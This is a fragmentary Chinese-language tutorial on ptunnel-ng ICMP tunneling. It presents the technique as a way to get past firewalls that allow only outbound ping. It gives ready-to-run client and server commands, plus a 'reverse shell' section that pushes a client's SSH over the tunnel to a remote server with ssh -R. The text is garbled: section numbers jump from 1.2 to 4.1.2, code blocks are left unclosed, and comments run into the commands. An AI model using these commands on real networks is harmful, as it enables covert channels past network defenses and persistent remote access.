1、简介  

  

##### 1.1 ptunnel简介

  

通过ICMP echo(ping requests) 和 reply （ping reply）实现隧道

  

适用于防火墙只允许ping出站流量的环境

  

支持多并发连接、性能优

  

支持身份认证

  

需要root权限

  

##### 1.2 ptunnel工具

  

*   ✅ptunnel : http://www.cs.uit.no/~daniels/PingTunnel/#download
    
*   ✅ptunnel-ng:  https://github.com/lnslbrty/ptunnel-ng
    
*   ✅pingtunnel: https://github.com/esrrhs/pingtunnel

###### **4.1.2 客户端配置**

*

```
ptunnel-ng -p192.168.207.134 -l8000 -r192.168.207.100 -R80 -P123456-p           #服务器IP地址-l           #本地监听端口-r           #需要访问WWW服务器的IP-R           #需要访问WWW服务器的端口-P           #认证端口

##### 4.2 反弹shell

客户端`192.168.1.2`把自己的ssh反弹到ptunnel-ng服务器`192.168.207.134`

###### **4.2.1 服务器上配置**

*   
*   

```
sudo ptunnel-ng -r192.168.207.134 -R22# 指定的服务器和端口都为ptunnel-ng服务器
```

###### **4.2.2 客户端配置**

*   
*   
*   
*   
*   

```
ptunnel-ng -p192.168.207.134 -l2222 -r192.168.207.134 -R22ssh -fCNg -R 22222:127.0.0.1:22 kali@127.0.0.1 -p2222# 22222端口为客户端开启ptunnel-ng服务器端口# 22端口为客户端本地SSH端口# 2222端口为ptunnel-ng服务器的22端口映射到客户端的2222端口
